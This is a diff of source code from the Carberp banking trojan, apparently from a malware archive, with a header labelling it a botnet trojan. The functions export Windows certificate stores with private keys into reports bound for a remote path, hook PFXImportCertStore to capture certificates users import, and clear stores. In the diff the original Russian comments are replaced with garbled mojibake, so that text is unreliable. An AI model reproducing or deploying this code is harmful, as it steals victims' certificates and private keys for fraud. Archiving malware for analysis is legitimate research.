@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <wincrypt.h>
 #include <shlwapi.h>
@@ -16,9 +27,9 @@
 #include "..\common\debug.h"
 
 /*
-  Получение текущего имени пользователя для пути сертификата.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  OUT buffer - буфер для для имени, размером MAX_PATH.
+  OUT buffer - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ MAX_PATH.
 */
 static void getUserNameForPath(LPWSTR buffer)
 {
@@ -35,13 +46,13 @@ static void getUserNameForPath(LPWSTR buffer)
 }
 
 /*
-  Экспорт хранилища в отчет.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ.
 
-  IN storeName - имя хранилища.
+  IN storeName - пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return       - true - если хранилище успещно прочитано и записано в отчет, если сертифкатов > 0.
-                 true - если хранилище успещно прочитано и если сертифкатов == 0.
-                 false - в случаи ошибки.
+  Return       - true - пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ > 0.
+                 true - пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ == 0.
+                 false - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool exportStore(LPWSTR storeName)
 {
@@ -51,7 +62,7 @@ static bool exportStore(LPWSTR storeName)
   HANDLE storeHandle = CWA(crypt32, CertOpenSystemStoreW)(NULL, storeName);
   if(storeHandle != NULL)
   {
-    //Получаем кол. сертификатов.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     DWORD certsCount = 0;
     {
       PCCERT_CONTEXT certContext = NULL;
@@ -61,7 +72,7 @@ static bool exportStore(LPWSTR storeName)
     if(certsCount == 0)retVal = true;
     else 
     {
-      //Получаем размер хранилища.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       CRYPT_DATA_BLOB pfxBlob;
       pfxBlob.pbData = NULL;
       pfxBlob.cbData = 0;
@@ -72,12 +83,12 @@ static bool exportStore(LPWSTR storeName)
       {
         if(CWA(crypt32, PFXExportCertStoreEx)(storeHandle, &pfxBlob, password, 0, EXPORT_PRIVATE_KEYS) != FALSE)
         {
-          //Делаем имя хранилища в нижний регистр.
+          //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
           WCHAR storeNameLower[CryptedStrings::len_certstore_export_remote_path * 2];
           Str::_CopyW(storeNameLower, storeName, -1);
           CWA(kernel32, CharLowerW)(storeNameLower);
 
-          //Генерируем имя.
+          //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ.
           WCHAR userName[MAX_PATH];
           WCHAR pfxName[CryptedStrings::len_certstore_export_remote_path * 2];
           SYSTEMTIME st;
@@ -101,12 +112,12 @@ static bool exportStore(LPWSTR storeName)
 }
 
 /*
-  Очистка хранилища.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN storeName - имя хранилища.
+  IN storeName - пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return       - true - в случаи успеха,
-                 false - в случаи ошибки.
+  Return       - true - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+                 false - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool clearStore(LPWSTR storeName)
 {
@@ -145,13 +156,13 @@ void * WINAPI CertStoreHook::_hookerPfxImportCertStore(CRYPT_DATA_BLOB *data, LP
   HCERTSTORE certstore = CWA(crypt32, PFXImportCertStore)(data, password, flags);
   if(certstore != NULL && (flags & 0x10000000) == 0 && data && data->cbData > 0 && data->pbData != NULL && Core::isActive())
   {
-    //Генерируем имя.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ.
     WCHAR userName[MAX_PATH];
     WCHAR pfxName[CryptedStrings::len_certstore_export_remote_path * 2];
     SYSTEMTIME st;
     CWA(kernel32, GetSystemTime)(&st);
       
-    //Пишим сертификат.
+    //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     CSTR_GETW(serverPath, certstore_export_remote_path);
     CSTR_GETW(prolog, certstore_export_prolog);
     getUserNameForPath(userName);
